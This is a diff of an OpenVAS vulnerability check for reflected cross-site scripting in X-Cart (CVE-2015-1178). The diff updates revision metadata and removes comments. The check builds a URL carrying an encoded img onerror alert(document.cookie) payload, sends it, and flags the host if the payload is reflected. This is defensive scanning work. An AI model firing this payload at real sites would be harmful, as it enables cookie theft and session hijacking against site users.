@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_xcart_mult_xss_vuln.nasl 6183 2017-05-22 09:03:43Z teissa $
+# $Id: gb_xcart_mult_xss_vuln.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # X_CART Multiple Cross Site Scripting Vulnerabilities
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:qualiteam:x-cart";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805600");
-  script_version("$Revision: 6183 $");
+  script_version("$Revision: 11291 $");
   script_cve_id("CVE-2015-1178");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-22 11:03:43 +0200 (Mon, 22 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-04-27 10:06:16 +0530 (Mon, 27 Apr 2015)");
   script_name("X_CART Multiple Cross Site Scripting Vulnerabilities");
   script_category(ACT_ATTACK);
@@ -79,20 +79,17 @@ if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
-##Construct Attack Request
 url = dir + "/cart.php?target=product&product_id=&category_id=1%E2%80%93--"
           + "%3E%3Cimg%20src=a%20onerror=alert%28document.cookie%29%3E";
 
 host = http_host_name( port:port );
 
-## Send and Receive the response
 sndReq = string("GET ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");
 rcvRes = http_keepalive_send_recv( port:port, data:sndReq );
 
-## check the response to confirm vulnerability
 if( rcvRes =~ "HTTP/1\.. 200" && "alert(document.cookie)" >< rcvRes && "X-Cart" >< rcvRes ) {
   report = report_vuln_url( port:port, url:url );
   security_message( port:port, data:report );
